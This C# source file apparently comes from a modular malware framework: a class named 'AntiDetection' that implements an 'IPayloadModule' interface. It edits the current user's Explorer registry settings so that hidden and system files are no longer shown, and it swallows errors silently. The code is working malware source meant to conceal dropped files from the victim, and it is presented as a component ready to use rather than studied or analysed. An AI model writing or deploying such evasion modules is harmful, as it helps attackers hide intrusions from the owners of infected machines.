using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public class AntiDetection : IPayloadModule
    {
        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "AntiDetection";

        public void Start()
        {
            HideHiddenFoldersFromExplorer();
            ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
        }

        public void Stop()
        {
            // No need to stop anything
        }

        public static void HideHiddenFoldersFromExplorer()
        {
            try
            {
                RegistryKey explorerKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);

                if (explorerKey != null)
                {
                    object hiddenValue = explorerKey.GetValue("Hidden");
                    if (hiddenValue == null || Convert.ToInt32(hiddenValue) != 2)
                    {
                        explorerKey.SetValue("Hidden", 2, RegistryValueKind.DWord); // Hide hidden files
                    }

                    object showSuperHiddenValue = explorerKey.GetValue("ShowSuperHidden");
                    if (showSuperHiddenValue == null || Convert.ToInt32(showSuperHiddenValue) != 0)
                    {
                        explorerKey.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord); // Hide system files
                    }

                    explorerKey.Close();
                }
            }
            catch
            {
                // Handle exceptions silently
            }
        }
    }
}
